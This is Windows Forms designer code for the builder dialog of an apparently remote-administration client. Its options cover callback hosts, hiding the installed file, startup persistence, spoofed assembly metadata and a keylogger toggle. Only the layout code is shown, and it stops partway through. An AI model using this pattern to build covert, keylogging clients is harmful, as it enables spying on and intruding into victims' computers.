﻿namespace xServer.Forms
{
    partial class FrmBuilder
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmBuilder));
            this.btnBuild = new System.Windows.Forms.Button();
            this.tooltip = new System.Windows.Forms.ToolTip(this.components);
            this.picUAC2 = new System.Windows.Forms.PictureBox();
            this.picUAC1 = new System.Windows.Forms.PictureBox();
            this.rbSystem = new System.Windows.Forms.RadioButton();
            this.rbProgramFiles = new System.Windows.Forms.RadioButton();
            this.chkIconChange = new System.Windows.Forms.CheckBox();
            this.ctxtMenuHosts = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.ctxtRemove = new System.Windows.Forms.ToolStripMenuItem();
            this.ctxtClear = new System.Windows.Forms.ToolStripMenuItem();
            this.builderTabs = new xServer.Controls.DotNetBarTabControl();
            this.generalPage = new System.Windows.Forms.TabPage();
            this.label9 = new System.Windows.Forms.Label();
            this.line6 = new xServer.Controls.Line();
            this.label8 = new System.Windows.Forms.Label();
            this.txtTag = new System.Windows.Forms.TextBox();
            this.label7 = new System.Windows.Forms.Label();
            this.lblTag = new System.Windows.Forms.Label();
            this.txtMutex = new System.Windows.Forms.TextBox();
            this.btnMutex = new System.Windows.Forms.Button();
            this.line5 = new xServer.Controls.Line();
            this.lblMutex = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.connectionPage = new System.Windows.Forms.TabPage();
            this.line3 = new xServer.Controls.Line();
            this.label4 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.line2 = new xServer.Controls.Line();
            this.label2 = new System.Windows.Forms.Label();
            this.line1 = new xServer.Controls.Line();
            this.label1 = new System.Windows.Forms.Label();
            this.lstHosts = new System.Windows.Forms.ListBox();
            this.btnAddHost = new System.Windows.Forms.Button();
            this.lblMS = new System.Windows.Forms.Label();
            this.lblHost = new System.Windows.Forms.Label();
            this.txtDelay = new System.Windows.Forms.TextBox();
            this.txtHost = new System.Windows.Forms.TextBox();
            this.lblDelay = new System.Windows.Forms.Label();
            this.lblPort = new System.Windows.Forms.Label();
            this.chkShowPass = new System.Windows.Forms.CheckBox();
            this.txtPort = new System.Windows.Forms.TextBox();
            this.txtPassword = new System.Windows.Forms.TextBox();
            this.lblPassword = new System.Windows.Forms.Label();
            this.installationPage = new System.Windows.Forms.TabPage();
            this.line7 = new xServer.Controls.Line();
            this.label10 = new System.Windows.Forms.Label();
            this.line4 = new xServer.Controls.Line();
            this.label5 = new System.Windows.Forms.Label();
            this.chkInstall = new System.Windows.Forms.CheckBox();
            this.lblInstallname = new System.Windows.Forms.Label();
            this.txtInstallname = new System.Windows.Forms.TextBox();
            this.txtRegistryKeyName = new System.Windows.Forms.TextBox();
            this.lblExtension = new System.Windows.Forms.Label();
            this.lblRegistryKeyName = new System.Windows.Forms.Label();
            this.chkStartup = new System.Windows.Forms.CheckBox();
            this.rbAppdata = new System.Windows.Forms.RadioButton();
            this.chkHide = new System.Windows.Forms.CheckBox();
            this.lblInstallpath = new System.Windows.Forms.Label();
            this.lblInstallsub = new System.Windows.Forms.Label();
            this.lblExamplePath = new System.Windows.Forms.Label();
            this.txtInstallsub = new System.Windows.Forms.TextBox();
            this.txtExamplePath = new System.Windows.Forms.TextBox();
            this.assemblyPage = new System.Windows.Forms.TabPage();
            this.line8 = new xServer.Controls.Line();
            this.label11 = new System.Windows.Forms.Label();
            this.chkChangeAsmInfo = new System.Windows.Forms.CheckBox();
            this.txtFileVersion = new System.Windows.Forms.TextBox();
            this.lblProductName = new System.Windows.Forms.Label();
            this.lblFileVersion = new System.Windows.Forms.Label();
            this.txtProductName = new System.Windows.Forms.TextBox();
            this.txtProductVersion = new System.Windows.Forms.TextBox();
            this.lblDescription = new System.Windows.Forms.Label();
            this.lblProductVersion = new System.Windows.Forms.Label();
            this.txtDescription = new System.Windows.Forms.TextBox();
            this.txtOriginalFilename = new System.Windows.Forms.TextBox();
            this.lblCompanyName = new System.Windows.Forms.Label();
            this.lblOriginalFilename = new System.Windows.Forms.Label();
            this.txtCompanyName = new System.Windows.Forms.TextBox();
            this.txtTrademarks = new System.Windows.Forms.TextBox();
            this.lblCopyright = new System.Windows.Forms.Label();
            this.lblTrademarks = new System.Windows.Forms.Label();
            this.txtCopyright = new System.Windows.Forms.TextBox();
            this.additionalTab = new System.Windows.Forms.TabPage();
            this.line10 = new xServer.Controls.Line();
            this.label14 = new System.Windows.Forms.Label();
            this.label13 = new System.Windows.Forms.Label();
            this.line9 = new xServer.Controls.Line();
            this.label12 = new System.Windows.Forms.Label();
            this.chkKeylogger = new System.Windows.Forms.CheckBox();
            ((System.ComponentModel.ISupportInitialize)(this.picUAC2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picUAC1)).BeginInit();
            this.ctxtMenuHosts.SuspendLayout();
            this.builderTabs.SuspendLayout();
            this.generalPage.SuspendLayout();
            this.connectionPage.SuspendLayout();
            this.installationPage.SuspendLayout();
            this.assemblyPage.SuspendLayout();
            this.additionalTab.SuspendLayout();
            this.SuspendLayout();
            // 
            // btnBuild
            // 
            this.btnBuild.Location = new System.Drawing.Point(402, 384);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.Size = new System.Drawing.Size(121, 23);
            this.btnBuild.TabIndex = 1;
            this.btnBuild.Text = "Build Client";
            this.btnBuild.UseVisualStyleBackColor = true;
            this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);
            // 
            // picUAC2
            // 
            this.picUAC2.Image = global::xServer.Properties.Resources.uac_shield;
            this.picUAC2.Location = new System.Drawing.Point(363, 88);
            this.picUAC2.Name = "picUAC2";
            this.picUAC2.Size = new System.Drawing.Size(16, 20);
            this.picUAC2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
            this.picUAC2.TabIndex = 32;
            this.picUAC2.TabStop = false;
            this.tooltip.SetToolTip(this.picUAC2, "Administrator Privileges are required to install the client in System.");
            // 
            // picUAC1
            // 
            this.picUAC1.Image = global::xServer.Properties.Resources.uac_shield;
            this.picUAC1.Location = new System.Drawing.Point(363, 68);
            this.picUAC1.Name = "picUAC1";
            this.picUAC1.Size = new System.Drawing.Size(16, 20);
            this.picUAC1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
            this.picUAC1.TabIndex = 31;
            this.picUAC1.TabStop = false;
            this.tooltip.SetToolTip(this.picUAC1, "Administrator Privileges are required to install the client in Program Files.");
            // 
            // rbSystem
            // 
            this.rbSystem.AutoSize = true;
            this.rbSystem.Location = new System.Drawing.Point(241, 91);
            this.rbSystem.Name = "rbSystem";
            this.rbSystem.Size = new System.Drawing.Size(60, 17);
            this.rbSystem.TabIndex = 5;
            this.rbSystem.TabStop = true;
            this.rbSystem.Text = "System";
            this.tooltip.SetToolTip(this.rbSystem, "Administrator Privileges are required to install the client in System.");
            this.rbSystem.UseVisualStyleBackColor = true;
            this.rbSystem.CheckedChanged += new System.EventHandler(this.HasChangedSettingAndFilePath);
            // 
            // rbProgramFiles
            // 
            this.rbProgramFiles.AutoSize = true;
            this.rbProgramFiles.Location = new System.Drawing.Point(241, 68);
            this.rbProgramFiles.Name = "rbProgramFiles";
            this.rbProgramFiles.Size = new System.Drawing.Size(94, 17);
            this.rbProgramFiles.TabIndex = 4;
            this.rbProgramFiles.TabStop = true;
            this.rbProgramFiles.Text = "Program Files";
            this.tooltip.SetToolTip(this.rbProgramFiles, "Administrator Privileges are required to install the client in Program Files.");
            this.rbProgramFiles.UseVisualStyleBackColor = true;
            this.rbProgramFiles.CheckedChanged += new System.EventHandler(this.HasChangedSettingAndFilePath);
            // 
            // chkIconChange
            // 
            this.chkIconChange.AutoSize = true;
            this.chkIconChange.Location = new System.Drawing.Point(23, 39);
            this.chkIconChange.Name = "chkIconChange";
            this.chkIconChange.Size = new System.Drawing.Size(91, 17);
            this.chkIconChange.TabIndex = 2;
            this.chkIconChange.Text = "Change Icon";
            this.chkIconChange.UseVisualStyleBackColor = true;
            this.chkIconChange.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // ctxtMenuHosts
            // 
            this.ctxtMenuHosts.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ctxtRemove,
            this.ctxtClear});
            this.ctxtMenuHosts.Name = "ctxtMenuHosts";
            this.ctxtMenuHosts.Size = new System.Drawing.Size(144, 48);
            // 
            // ctxtRemove
            // 
            this.ctxtRemove.Image = global::xServer.Properties.Resources.delete;
            this.ctxtRemove.Name = "ctxtRemove";
            this.ctxtRemove.Size = new System.Drawing.Size(143, 22);
            this.ctxtRemove.Text = "Remove host";
            this.ctxtRemove.Click += new System.EventHandler(this.ctxtRemove_Click);
            // 
            // ctxtClear
            // 
            this.ctxtClear.Image = global::xServer.Properties.Resources.broom;
            this.ctxtClear.Name = "ctxtClear";
            this.ctxtClear.Size = new System.Drawing.Size(143, 22);
            this.ctxtClear.Text = "Clear all";
            this.ctxtClear.Click += new System.EventHandler(this.ctxtClear_Click);
            // 
            // builderTabs
            // 
            this.builderTabs.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.builderTabs.Controls.Add(this.generalPage);
            this.builderTabs.Controls.Add(this.connectionPage);
            this.builderTabs.Controls.Add(this.installationPage);
            this.builderTabs.Controls.Add(this.assemblyPage);
            this.builderTabs.Controls.Add(this.additionalTab);
            this.builderTabs.Dock = System.Windows.Forms.DockStyle.Top;
            this.builderTabs.ItemSize = new System.Drawing.Size(44, 136);
            this.builderTabs.Location = new System.Drawing.Point(0, 0);
            this.builderTabs.Multiline = true;
            this.builderTabs.Name = "builderTabs";
            this.builderTabs.SelectedIndex = 0;
            this.builderTabs.Size = new System.Drawing.Size(535, 378);
            this.builderTabs.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.builderTabs.TabIndex = 0;
            // 
            // generalPage
            // 
            this.generalPage.BackColor = System.Drawing.SystemColors.Control;
            this.generalPage.Controls.Add(this.label9);
            this.generalPage.Controls.Add(this.line6);
            this.generalPage.Controls.Add(this.label8);
            this.generalPage.Controls.Add(this.txtTag);
            this.generalPage.Controls.Add(this.label7);
            this.generalPage.Controls.Add(this.lblTag);
            this.generalPage.Controls.Add(this.txtMutex);
            this.generalPage.Controls.Add(this.btnMutex);
            this.generalPage.Controls.Add(this.line5);
            this.generalPage.Controls.Add(this.lblMutex);
            this.generalPage.Controls.Add(this.label6);
            this.generalPage.Location = new System.Drawing.Point(140, 4);
            this.generalPage.Name = "generalPage";
            this.generalPage.Padding = new System.Windows.Forms.Padding(3);
            this.generalPage.Size = new System.Drawing.Size(391, 370);
            this.generalPage.TabIndex = 4;
            this.generalPage.Text = "General Settings";
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Location = new System.Drawing.Point(17, 94);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(370, 26);
            this.label9.TabIndex = 5;
            this.label9.Text = "A unique mutex ensures that only one instance of the client is running\r\non the sa" +
    "me system.";
            // 
            // line6
            // 
            this.line6.LineAlignment = xServer.Controls.Line.Alignment.Horizontal;
            this.line6.Location = new System.Drawing.Point(83, 78);
            this.line6.Name = "line6";
            this.line6.Size = new System.Drawing.Size(300, 13);
            this.line6.TabIndex = 20;
            this.line6.TabStop = false;
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(6, 78);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(80, 13);
            this.label8.TabIndex = 4;
            this.label8.Text = "Process Mutex";
            // 
            // txtTag
            // 
            this.txtTag.Location = new System.Drawing.Point(182, 40);
            this.txtTag.Name = "txtTag";
            this.txtTag.Size = new System.Drawing.Size(203, 22);
            this.txtTag.TabIndex = 3;
            this.txtTag.Text = "Office04";
            this.txtTag.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(17, 20);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(324, 13);
            this.label7.TabIndex = 1;
            this.label7.Text = "You can choose a tag which helps you to identify your clients.";
            // 
            // lblTag
            // 
            this.lblTag.AutoSize = true;
            this.lblTag.Location = new System.Drawing.Point(17, 43);
            this.lblTag.Name = "lblTag";
            this.lblTag.Size = new System.Drawing.Size(61, 13);
            this.lblTag.TabIndex = 2;
            this.lblTag.Text = "Client Tag:";
            // 
            // txtMutex
            // 
            this.txtMutex.Location = new System.Drawing.Point(182, 130);
            this.txtMutex.MaxLength = 64;
            this.txtMutex.Name = "txtMutex";
            this.txtMutex.Size = new System.Drawing.Size(201, 22);
            this.txtMutex.TabIndex = 7;
            this.txtMutex.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // btnMutex
            // 
            this.btnMutex.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnMutex.Location = new System.Drawing.Point(262, 158);
            this.btnMutex.Name = "btnMutex";
            this.btnMutex.Size = new System.Drawing.Size(121, 23);
            this.btnMutex.TabIndex = 8;
            this.btnMutex.Text = "Random Mutex";
            this.btnMutex.UseVisualStyleBackColor = true;
            this.btnMutex.Click += new System.EventHandler(this.btnMutex_Click);
            // 
            // line5
            // 
            this.line5.LineAlignment = xServer.Controls.Line.Alignment.Horizontal;
            this.line5.Location = new System.Drawing.Point(112, 5);
            this.line5.Name = "line5";
            this.line5.Size = new System.Drawing.Size(271, 13);
            this.line5.TabIndex = 15;
            this.line5.TabStop = false;
            // 
            // lblMutex
            // 
            this.lblMutex.AutoSize = true;
            this.lblMutex.Location = new System.Drawing.Point(17, 133);
            this.lblMutex.Name = "lblMutex";
            this.lblMutex.Size = new System.Drawing.Size(42, 13);
            this.lblMutex.TabIndex = 6;
            this.lblMutex.Text = "Mutex:";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(6, 5);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(109, 13);
            this.label6.TabIndex = 0;
            this.label6.Text = "Client Identification";
            // 
            // connectionPage
            // 
            this.connectionPage.BackColor = System.Drawing.SystemColors.Control;
            this.connectionPage.Controls.Add(this.line3);
            this.connectionPage.Controls.Add(this.label4);
            this.connectionPage.Controls.Add(this.label3);
            this.connectionPage.Controls.Add(this.line2);
            this.connectionPage.Controls.Add(this.label2);
            this.connectionPage.Controls.Add(this.line1);
            this.connectionPage.Controls.Add(this.label1);
            this.connectionPage.Controls.Add(this.lstHosts);
            this.connectionPage.Controls.Add(this.btnAddHost);
            this.connectionPage.Controls.Add(this.lblMS);
            this.connectionPage.Controls.Add(this.lblHost);
            this.connectionPage.Controls.Add(this.txtDelay);
            this.connectionPage.Controls.Add(this.txtHost);
            this.connectionPage.Controls.Add(this.lblDelay);
            this.connectionPage.Controls.Add(this.lblPort);
            this.connectionPage.Controls.Add(this.chkShowPass);
            this.connectionPage.Controls.Add(this.txtPort);
            this.connectionPage.Controls.Add(this.txtPassword);
            this.connectionPage.Controls.Add(this.lblPassword);
            this.connectionPage.Location = new System.Drawing.Point(140, 4);
            this.connectionPage.Name = "connectionPage";
            this.connectionPage.Padding = new System.Windows.Forms.Padding(3);
            this.connectionPage.Size = new System.Drawing.Size(391, 370);
            this.connectionPage.TabIndex = 0;
            this.connectionPage.Text = "Connection";
            // 
            // line3
            // 
            this.line3.LineAlignment = xServer.Controls.Line.Alignment.Horizontal;
            this.line3.Location = new System.Drawing.Point(95, 263);
            this.line3.Name = "line3";
            this.line3.Size = new System.Drawing.Size(290, 13);
            this.line3.TabIndex = 18;
            this.line3.TabStop = false;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(6, 263);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(92, 13);
            this.label4.TabIndex = 17;
            this.label4.Text = "Reconnect Delay";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.ForeColor = System.Drawing.Color.SteelBlue;
            this.label3.Location = new System.Drawing.Point(17, 179);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(318, 13);
            this.label3.TabIndex = 16;
            this.label3.Text = "Don\'t forget to set the same password in the server settings.";
            // 
            // line2
            // 
            this.line2.LineAlignment = xServer.Controls.Line.Alignment.Horizontal;
            this.line2.Location = new System.Drawing.Point(123, 161);
            this.line2.Name = "line2";
            this.line2.Size = new System.Drawing.Size(260, 13);
            this.line2.TabIndex = 15;
            this.line2.TabStop = false;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(6, 161);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(121, 13);
            this.label2.TabIndex = 14;
            this.label2.Text = "Encrypted Connection";
            // 
            // line1
            // 
            this.line1.LineAlignment = xServer.Controls.Line.Alignment.Horizontal;
            this.line1.Location = new System.Drawing.Point(73, 5);
            this.line1.Name = "line1";
            this.line1.Size = new System.Drawing.Size(310, 13);
            this.line1.TabIndex = 13;
            this.line1.TabStop = false;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(6, 5);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(70, 13);
            this.label1.TabIndex = 14;
            this.label1.Text = "List of Hosts";
            // 
            // lstHosts
            // 
            this.lstHosts.ContextMenuStrip = this.ctxtMenuHosts;
            this.lstHosts.FormattingEnabled = true;
            this.lstHosts.Location = new System.Drawing.Point(20, 21);
            this.lstHosts.Name = "lstHosts";
            this.lstHosts.Size = new System.Drawing.Size(149, 121);
            this.lstHosts.TabIndex = 5;
            this.lstHosts.TabStop = false;
            // 
            // btnAddHost
            // 
            this.btnAddHost.Location = new System.Drawing.Point(254, 78);
            this.btnAddHost.Name = "btnAddHost";
            this.btnAddHost.Size = new System.Drawing.Size(129, 22);
            this.btnAddHost.TabIndex = 4;
            this.btnAddHost.Text = "Add Host";
            this.btnAddHost.UseVisualStyleBackColor = true;
            this.btnAddHost.Click += new System.EventHandler(this.btnAddHost_Click);
            // 
            // lblMS
            // 
            this.lblMS.AutoSize = true;
            this.lblMS.Location = new System.Drawing.Point(356, 287);
            this.lblMS.Name = "lblMS";
            this.lblMS.Size = new System.Drawing.Size(21, 13);
            this.lblMS.TabIndex = 11;
            this.lblMS.Text = "ms";
            // 
            // lblHost
            // 
            this.lblHost.AutoSize = true;
            this.lblHost.Location = new System.Drawing.Point(175, 25);
            this.lblHost.Name = "lblHost";
            this.lblHost.Size = new System.Drawing.Size(75, 13);
            this.lblHost.TabIndex = 0;
            this.lblHost.Text = "IP/Hostname:";
            // 
            // txtDelay
            // 
            this.txtDelay.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtDelay.Location = new System.Drawing.Point(310, 282);
            this.txtDelay.MaxLength = 6;
            this.txtDelay.Name = "txtDelay";
            this.txtDelay.Size = new System.Drawing.Size(46, 22);
            this.txtDelay.TabIndex = 10;
            this.txtDelay.Text = "5000";
            this.txtDelay.TextChanged += new System.EventHandler(this.HasChangedSetting);
            this.txtDelay.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtDelay_KeyPress);
            // 
            // txtHost
            // 
            this.txtHost.Location = new System.Drawing.Point(254, 22);
            this.txtHost.Name = "txtHost";
            this.txtHost.Size = new System.Drawing.Size(129, 22);
            this.txtHost.TabIndex = 1;
            // 
            // lblDelay
            // 
            this.lblDelay.AutoSize = true;
            this.lblDelay.Location = new System.Drawing.Point(17, 286);
            this.lblDelay.Name = "lblDelay";
            this.lblDelay.Size = new System.Drawing.Size(199, 13);
            this.lblDelay.TabIndex = 9;
            this.lblDelay.Text = "Time to wait between reconnect tries:";
            // 
            // lblPort
            // 
            this.lblPort.AutoSize = true;
            this.lblPort.Location = new System.Drawing.Point(175, 53);
            this.lblPort.Name = "lblPort";
            this.lblPort.Size = new System.Drawing.Size(31, 13);
            this.lblPort.TabIndex = 2;
            this.lblPort.Text = "Port:";
            // 
            // chkShowPass
            // 
            this.chkShowPass.AutoSize = true;
            this.chkShowPass.Location = new System.Drawing.Point(276, 228);
            this.chkShowPass.Name = "chkShowPass";
            this.chkShowPass.Size = new System.Drawing.Size(107, 17);
            this.chkShowPass.TabIndex = 8;
            this.chkShowPass.Text = "Show Password";
            this.chkShowPass.UseVisualStyleBackColor = true;
            this.chkShowPass.CheckedChanged += new System.EventHandler(this.chkShowPass_CheckedChanged);
            // 
            // txtPort
            // 
            this.txtPort.Location = new System.Drawing.Point(254, 50);
            this.txtPort.MaxLength = 5;
            this.txtPort.Name = "txtPort";
            this.txtPort.Size = new System.Drawing.Size(129, 22);
            this.txtPort.TabIndex = 3;
            this.txtPort.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtPort_KeyPress);
            // 
            // txtPassword
            // 
            this.txtPassword.Location = new System.Drawing.Point(182, 200);
            this.txtPassword.Name = "txtPassword";
            this.txtPassword.PasswordChar = '•';
            this.txtPassword.Size = new System.Drawing.Size(201, 22);
            this.txtPassword.TabIndex = 7;
            this.txtPassword.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // lblPassword
            // 
            this.lblPassword.AutoSize = true;
            this.lblPassword.Location = new System.Drawing.Point(17, 203);
            this.lblPassword.Name = "lblPassword";
            this.lblPassword.Size = new System.Drawing.Size(59, 13);
            this.lblPassword.TabIndex = 6;
            this.lblPassword.Text = "Password:";
            // 
            // installationPage
            // 
            this.installationPage.BackColor = System.Drawing.SystemColors.Control;
            this.installationPage.Controls.Add(this.line7);
            this.installationPage.Controls.Add(this.label10);
            this.installationPage.Controls.Add(this.line4);
            this.installationPage.Controls.Add(this.label5);
            this.installationPage.Controls.Add(this.picUAC2);
            this.installationPage.Controls.Add(this.picUAC1);
            this.installationPage.Controls.Add(this.chkInstall);
            this.installationPage.Controls.Add(this.rbSystem);
            this.installationPage.Controls.Add(this.lblInstallname);
            this.installationPage.Controls.Add(this.rbProgramFiles);
            this.installationPage.Controls.Add(this.txtInstallname);
            this.installationPage.Controls.Add(this.txtRegistryKeyName);
            this.installationPage.Controls.Add(this.lblExtension);
            this.installationPage.Controls.Add(this.lblRegistryKeyName);
            this.installationPage.Controls.Add(this.chkStartup);
            this.installationPage.Controls.Add(this.rbAppdata);
            this.installationPage.Controls.Add(this.chkHide);
            this.installationPage.Controls.Add(this.lblInstallpath);
            this.installationPage.Controls.Add(this.lblInstallsub);
            this.installationPage.Controls.Add(this.lblExamplePath);
            this.installationPage.Controls.Add(this.txtInstallsub);
            this.installationPage.Controls.Add(this.txtExamplePath);
            this.installationPage.Location = new System.Drawing.Point(140, 4);
            this.installationPage.Name = "installationPage";
            this.installationPage.Padding = new System.Windows.Forms.Padding(3);
            this.installationPage.Size = new System.Drawing.Size(391, 370);
            this.installationPage.TabIndex = 1;
            this.installationPage.Text = "Installation";
            // 
            // line7
            // 
            this.line7.LineAlignment = xServer.Controls.Line.Alignment.Horizontal;
            this.line7.Location = new System.Drawing.Point(60, 274);
            this.line7.Name = "line7";
            this.line7.Size = new System.Drawing.Size(323, 13);
            this.line7.TabIndex = 36;
            this.line7.TabStop = false;
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Location = new System.Drawing.Point(7, 274);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(55, 13);
            this.label10.TabIndex = 14;
            this.label10.Text = "Autostart";
            // 
            // line4
            // 
            this.line4.LineAlignment = xServer.Controls.Line.Alignment.Horizontal;
            this.line4.Location = new System.Drawing.Point(117, 5);
            this.line4.Name = "line4";
            this.line4.Size = new System.Drawing.Size(266, 13);
            this.line4.TabIndex = 34;
            this.line4.TabStop = false;
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(6, 5);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(112, 13);
            this.label5.TabIndex = 0;
            this.label5.Text = "Installation Location";
            // 
            // chkInstall
            // 
            this.chkInstall.AutoSize = true;
            this.chkInstall.Location = new System.Drawing.Point(20, 21);
            this.chkInstall.Name = "chkInstall";
            this.chkInstall.Size = new System.Drawing.Size(90, 17);
            this.chkInstall.TabIndex = 1;
            this.chkInstall.Text = "Install Client";
            this.chkInstall.UseVisualStyleBackColor = true;
            this.chkInstall.CheckedChanged += new System.EventHandler(this.chkInstall_CheckedChanged);
            // 
            // lblInstallname
            // 
            this.lblInstallname.AutoSize = true;
            this.lblInstallname.Location = new System.Drawing.Point(17, 156);
            this.lblInstallname.Name = "lblInstallname";
            this.lblInstallname.Size = new System.Drawing.Size(73, 13);
            this.lblInstallname.TabIndex = 8;
            this.lblInstallname.Text = "Install Name:";
            // 
            // txtInstallname
            // 
            this.txtInstallname.Location = new System.Drawing.Point(182, 153);
            this.txtInstallname.Name = "txtInstallname";
            this.txtInstallname.Size = new System.Drawing.Size(170, 22);
            this.txtInstallname.TabIndex = 9;
            this.txtInstallname.TextChanged += new System.EventHandler(this.HasChangedSettingAndFilePath);
            this.txtInstallname.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtInstallname_KeyPress);
            // 
            // txtRegistryKeyName
            // 
            this.txtRegistryKeyName.Location = new System.Drawing.Point(182, 324);
            this.txtRegistryKeyName.Name = "txtRegistryKeyName";
            this.txtRegistryKeyName.Size = new System.Drawing.Size(201, 22);
            this.txtRegistryKeyName.TabIndex = 17;
            this.txtRegistryKeyName.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // lblExtension
            // 
            this.lblExtension.AutoSize = true;
            this.lblExtension.Location = new System.Drawing.Point(352, 159);
            this.lblExtension.Name = "lblExtension";
            this.lblExtension.Size = new System.Drawing.Size(27, 13);
            this.lblExtension.TabIndex = 10;
            this.lblExtension.Text = ".exe";
            // 
            // lblRegistryKeyName
            // 
            this.lblRegistryKeyName.AutoSize = true;
            this.lblRegistryKeyName.Location = new System.Drawing.Point(17, 327);
            this.lblRegistryKeyName.Name = "lblRegistryKeyName";
            this.lblRegistryKeyName.Size = new System.Drawing.Size(103, 13);
            this.lblRegistryKeyName.TabIndex = 16;
            this.lblRegistryKeyName.Text = "Registry Key Name:";
            // 
            // chkStartup
            // 
            this.chkStartup.AutoSize = true;
            this.chkStartup.Location = new System.Drawing.Point(20, 298);
            this.chkStartup.Name = "chkStartup";
            this.chkStartup.Size = new System.Drawing.Size(102, 17);
            this.chkStartup.TabIndex = 15;
            this.chkStartup.Text = "Add to Startup";
            this.chkStartup.UseVisualStyleBackColor = true;
            this.chkStartup.CheckedChanged += new System.EventHandler(this.chkStartup_CheckedChanged);
            // 
            // rbAppdata
            // 
            this.rbAppdata.AutoSize = true;
            this.rbAppdata.Checked = true;
            this.rbAppdata.Location = new System.Drawing.Point(241, 45);
            this.rbAppdata.Name = "rbAppdata";
            this.rbAppdata.Size = new System.Drawing.Size(137, 17);
            this.rbAppdata.TabIndex = 3;
            this.rbAppdata.TabStop = true;
            this.rbAppdata.Text = "User Application Data";
            this.rbAppdata.UseVisualStyleBackColor = true;
            this.rbAppdata.CheckedChanged += new System.EventHandler(this.HasChangedSettingAndFilePath);
            // 
            // chkHide
            // 
            this.chkHide.AutoSize = true;
            this.chkHide.Location = new System.Drawing.Point(20, 185);
            this.chkHide.Name = "chkHide";
            this.chkHide.Size = new System.Drawing.Size(71, 17);
            this.chkHide.TabIndex = 11;
            this.chkHide.Text = "Hide File";
            this.chkHide.UseVisualStyleBackColor = true;
            this.chkHide.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // lblInstallpath
            // 
            this.lblInstallpath.AutoSize = true;
            this.lblInstallpath.Location = new System.Drawing.Point(17, 47);
            this.lblInstallpath.Name = "lblInstallpath";
            this.lblInstallpath.Size = new System.Drawing.Size(67, 13);
            this.lblInstallpath.TabIndex = 2;
            this.lblInstallpath.Text = "Install Path:";
            // 
            // lblInstallsub
            // 
            this.lblInstallsub.AutoSize = true;
            this.lblInstallsub.Location = new System.Drawing.Point(17, 126);
            this.lblInstallsub.Name = "lblInstallsub";
            this.lblInstallsub.Size = new System.Drawing.Size(95, 13);
            this.lblInstallsub.TabIndex = 6;
            this.lblInstallsub.Text = "Install Subfolder:";
            // 
            // lblExamplePath
            // 
            this.lblExamplePath.AutoSize = true;
            this.lblExamplePath.Location = new System.Drawing.Point(17, 218);
            this.lblExamplePath.Name = "lblExamplePath";
            this.lblExamplePath.Size = new System.Drawing.Size(267, 13);
            this.lblExamplePath.TabIndex = 12;
            this.lblExamplePath.Text = "This is the path for the installation on your system.";
            // 
            // txtInstallsub
            // 
            this.txtInstallsub.Location = new System.Drawing.Point(182, 123);
            this.txtInstallsub.Name = "txtInstallsub";
            this.txtInstallsub.Size = new System.Drawing.Size(201, 22);
            this.txtInstallsub.TabIndex = 7;
            this.txtInstallsub.TextChanged += new System.EventHandler(this.HasChangedSettingAndFilePath);
            this.txtInstallsub.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtInstallsub_KeyPress);
            // 
            // txtExamplePath
            // 
